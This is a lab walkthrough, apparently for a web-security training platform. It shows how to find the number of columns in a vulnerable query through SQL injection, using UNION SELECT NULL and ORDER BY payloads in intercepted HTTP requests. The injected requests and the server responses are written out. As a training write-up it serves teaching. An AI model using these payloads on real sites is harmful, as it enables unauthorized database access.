---
# SQL Injection Lab #3: 
## SQL injection UNION attack, determining the number of columns returned by the query

---

## 1. Attack Overview & Key Concepts

### SQL UNION Attack Rules

To perform a successful `UNION` attack and extract data from other database tables, two basic conditions must be met:

1. **Column Count Match:** The injected query must return the exact same number of columns as the original application query.
2. **Data Type Compatibility:** The data types of the corresponding columns must be compatible between both queries.

### Methods for Column Determination

* **Method 1 (UNION SELECT NULL):** Inject increasing numbers of `NULL` values until the application returns a `200 OK` response instead of a database error (`500 Internal Server Error`).
* **Method 2 (ORDER BY):** Inject increasing numbers into an `ORDER BY` clause (e.g., `ORDER BY 1`, `ORDER BY 2`) until an error occurs, indicating the column index is out of bounds.

---

## 2. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Category Filter Request in Burp     |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Test SQL Injection Vulnerability             |
|  Payload: '                                           |
|  Outcome: 500 Internal Server Error (Query Breaks)    |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Confirm Vulnerability                        |
|  Payload: '--                                         |
|  Outcome: 200 OK (Syntax Fixed)                       |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Determine Number of Columns                  |
+-------------------------------------------------------+
              |                             |
              v                             v
   [Method A: UNION SELECT]        [Method B: ORDER BY]
              |                             |
  Try: UNION SELECT NULL--      Try: ORDER BY 1-- (200 OK)
       -> Error (500)                       |
              |                 Try: ORDER BY 2-- (200 OK)
  Try: UNION SELECT NULL, NULL--            |
       -> Error (500)           Try: ORDER BY 3-- (200 OK)
              |                             |
  Try: UNION SELECT NULL, NULL, NULL-- Try: ORDER BY 4--
       -> Success (200 OK)         -> Error (500)
              |                             |
              +--------------+--------------+
                             |
                             v
+-------------------------------------------------------+
|  Step 5: Conclusion - Total Columns = 3               |
+-------------------------------------------------------+

```

---

## 3. UML Sequence Diagram

```
User / Browser           Burp Suite / Proxy         Web Application            Database
      |                          |                         |                      |
      |--- 1. Select Category --->|                         |                      |
      |    (Gifts)               |                         |                      |
      |                          |--- 2. Forward Request ->|                      |
      |                          |                         |--- 3. SQL Query ---->|
      |                          |                         |<-- 4. Product Data --|
      |                          |<-- 5. HTTP 200 OK ------|                      |
      |                          |                         |                      |
      |=== 6. Test Vulnerability (') =================================================|
      |                          |                         |                      |
      |                          |--- 7. Inject Quote ---> |                      |
      |                          |                           SELECT * FROM ...    |
      |                          |                           WHERE category = ''' |
      |                          |                         |                      |
      |                          |                         |--- 8. Execute SQL -->|
      |                          |                         |<-- 9. Syntax Error --|
      |                          |<-- 10. HTTP 500 Error --|                      |
      |                          |                         |                      |
      |=== 11. Test Payload (' UNION SELECT NULL, NULL, NULL--) =======================|
      |                          |                         |                      |
      |                          |--- 12. Send Payload --> |                      |
      |                          |                           SELECT * FROM ...    |
      |                          |                           UNION SELECT         |
      |                          |                           NULL, NULL, NULL--   |
      |                          |                         |                      |
      |                          |                         |--- 13. Execute SQL ->|
      |                          |                         |<-- 14. Combined Data-|
      |                          |<-- 15. HTTP 200 OK -----|                      |
      |<-- 16. Lab Solved! ------|                         |                      |

```

---

## 4. Step-by-Step Lab Walkthrough

### Step 1: Intercept the Request

1. Open **Burp Suite** and ensure intercept mode is enabled.
2. In your browser, navigate to the target web application and select any product category filter (e.g., `Gifts`).
3. Intercept the HTTP GET request in Burp Suite:
```http
GET /filter?category=Gifts HTTP/1.1
Host: target-app.web-security-academy.net

```


4. Right-click the request and select **Send to Repeater** (`Ctrl + R`).

---

### Step 2: Confirm SQL Injection Vulnerability

1. In Burp Repeater, modify the `category` parameter to inject a single quotation mark:
```http
GET /filter?category=Gifts' HTTP/1.1

```


2. Click **Send**.
* **Response:** `500 Internal Server Error` (Confirms that the single quote broke the backend SQL syntax).


3. Now append comment characters (`--` or `--+`) to fix the query syntax:
```http
GET /filter?category=Gifts'-- HTTP/1.1

```


4. Click **Send**.
* **Response:** `200 OK` (Confirms the parameter is vulnerable to SQL injection).



---

### Step 3: Determine Column Count via UNION SELECT NULL

Inject increasing numbers of `NULL` values until the request succeeds without throwing a server error. Remember to URL-encode space characters as `+` or `%20`.

#### Test 1 Column:

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL-- HTTP/1.1

```

* **Response:** `500 Internal Server Error`

#### Test 2 Columns:

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL-- HTTP/1.1

```

* **Response:** `500 Internal Server Error`

#### Test 3 Columns:

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL-- HTTP/1.1

```

* **Response:** `200 OK`

---

### Step 4: Alternative Method - Determine Column Count via ORDER BY

You can also use the `ORDER BY` clause directly in the browser address bar to find the column limit:

1. `.../filter?category=Gifts' ORDER BY 1--` $\rightarrow$ **200 OK** (Column 1 exists)
2. `.../filter?category=Gifts' ORDER BY 2--` $\rightarrow$ **200 OK** (Column 2 exists)
3. `.../filter?category=Gifts' ORDER BY 3--` $\rightarrow$ **200 OK** (Column 3 exists)
4. `.../filter?category=Gifts' ORDER BY 4--` $\rightarrow$ **500 Internal Server Error** (Column 4 does not exist)

---

### Step 5: Final Verification & Conclusion

Because `ORDER BY 4` failed and `UNION SELECT NULL, NULL, NULL` succeeded, the total number of columns returned by the backend database query is **3**.

* **Lab Result:** Solved successfully.